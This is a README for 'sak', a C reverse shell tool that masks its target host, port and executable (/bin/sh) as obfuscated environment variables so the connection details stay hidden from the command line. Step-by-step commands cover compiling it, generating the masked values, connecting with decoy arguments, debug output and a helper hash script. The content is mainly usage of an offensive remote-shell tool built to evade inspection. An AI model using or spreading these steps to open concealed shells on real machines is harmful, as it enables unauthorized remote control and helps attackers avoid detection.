# sak

*A reverse shell "Swiss Army Knife"*

## Demo

![sak-demo](https://user-images.githubusercontent.com/26688050/202610772-ff4b6b58-4b4e-48b9-b85d-496d257e47fc.gif)


## Compile Source

Clone this repo and compile with `gcc`
  - *you can change values defined in `sak.c` for custom env vars*

```bash
gcc sak.c -o sak
```

## Generate Environment

The `SAKTST` env var is a "toggle" to help generate masked values

Set `SAKTST=123` before running with args `./sak [ip] [port] [mask] [exec]`

```bash
SAKTST=123 ./sak 127.0.0.1 1337 hashmaskhere /bin/sh
# --------------------------------
# ENV: 127.0.0.1:1337
# --------------------------------
# SAKHSH=hashmaskhere
# SAKHST=595344465D4F434559
# SAKPRT=5952405F
# SAKEXC=47031A0642121B
```

Use the output as env vars for calling `./sak` again
  - *without `SAKTST=123`, cli args to `sak` are ignored*

## Connect Target

Either `export` all variables before, or prefix command to connect

```bash
export SAKHSH=hashmaskhere
export SAKHST=595344465D4F434559
export SAKPRT=5952405F
export SAKEXC=47031A0642121B
./sak --anthing goes=here
```

**OR ONE LINER**

```bash
SAKHSH=hashmaskhere SAKHST=595344465D4F434559 SAKPRT=5952405F SAKEXC=47031A0642121B ./sak --anthing goes=here
```

### Debug Mode

The `SAKDBG` env var is a toggle to display unmasked values on connecting

Set `SAKDBG=69` before running `./sak`

```bash
export SAKHSH=hashmaskhere
export SAKHST=595344465D4F434559
export SAKPRT=5952405F
export SAKEXC=47031A0642121B
export SAKDBG=69 # Enable debug output

./sak --fake-args

# CONN: 127.0.0.1:1337 ...
# HOST: [595344465D4F434559] => 127.0.0.1
# PORT: [5952405F] => 1337
# EXEC: [47031A0642121B] => /bin/sh

```

## Helper Script

Provided auto-hash generator script

```bash
# Set target ip
export SAKIP=127.0.0.1
# Generate values for given port with random hash
./gen.sh 1337
# Also works with multiple ports
./gen.sh 1337 4444 9999
```

## Error Handloling

Missing env/hash

```bash
./sak
# Epic fail
```

Invalid hash/port values

```bash
SAKHSH=Wr0nG SAKHST=595344465D4F434559 SAKPRT=5952405F SAKEXC=47031A0642121B ./sak --anthing goes=here

# Out of range
```
